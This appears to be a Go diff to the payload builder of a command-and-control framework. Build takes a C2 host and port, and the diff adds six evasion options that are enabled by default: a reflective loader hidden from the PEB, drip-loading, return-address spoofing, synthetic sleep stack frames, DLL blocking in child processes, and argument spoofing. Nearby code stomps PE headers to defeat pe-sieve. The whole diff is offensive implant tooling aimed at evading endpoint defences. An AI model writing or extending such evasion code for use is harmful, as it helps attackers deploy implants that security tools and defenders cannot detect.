@@ -65,6 +65,12 @@ type EvasionOpts struct {
 	PeStomp          bool   // Overwrite MZ/PE header in-memory to defeat pe-sieve
 	PeStompMode      int    // 1=DOS-only 2=full-NT-headers 3=sledgehammer
 	PeStompRandomise bool   // false=zero-fill true=pseudo-random fill
+	UDRL             bool   // User-Defined Reflective Loader (no PEB registration)
+	DripLoad         bool   // Gradual memory allocation evasion
+	RetAddrSpoof     bool   // Thread return address spoofing
+	SyntheticFrames  bool   // Synthetic stack frames during sleep
+	BlockDLLs        bool   // Block non-Microsoft DLLs in child processes
+	ArgSpoof         bool   // Process argument spoofing
 }
 
 // PosixEvasionOpts holds compile-time evasion toggles (Linux/macOS).
@@ -159,6 +165,12 @@ func Build(agentDir string, platform Platform, outputFormat, c2Host string, c2Po
 			PeStomp:          true,
 			PeStompMode:      2,
 			PeStompRandomise: false,
+			UDRL:             true,
+			DripLoad:         true,
+			RetAddrSpoof:     true,
+			SyntheticFrames:  true,
+			BlockDLLs:        true,
+			ArgSpoof:         true,
 		}
 		if evasion != nil {
 			ev = *evasion
@@ -185,6 +197,12 @@ func Build(agentDir string, platform Platform, outputFormat, c2Host string, c2Po
 			"ENABLE_PE_STOMP="+boolToFlag(ev.PeStomp),
 			fmt.Sprintf("PE_STOMP_MODE=%d", ev.PeStompMode),
 			"PE_STOMP_RANDOMISE="+boolToFlag(ev.PeStompRandomise),
+			"ENABLE_UDRL="+boolToFlag(ev.UDRL),
+			"ENABLE_DRIP_LOAD="+boolToFlag(ev.DripLoad),
+			"ENABLE_RET_ADDR_SPOOF="+boolToFlag(ev.RetAddrSpoof),
+			"ENABLE_SYNTHETIC_FRAMES="+boolToFlag(ev.SyntheticFrames),
+			"ENABLE_BLOCK_DLLS="+boolToFlag(ev.BlockDLLs),
+			"ENABLE_ARG_SPOOF="+boolToFlag(ev.ArgSpoof),
 		)
 		switch strings.ToLower(outputFormat) {
 		case "exe":
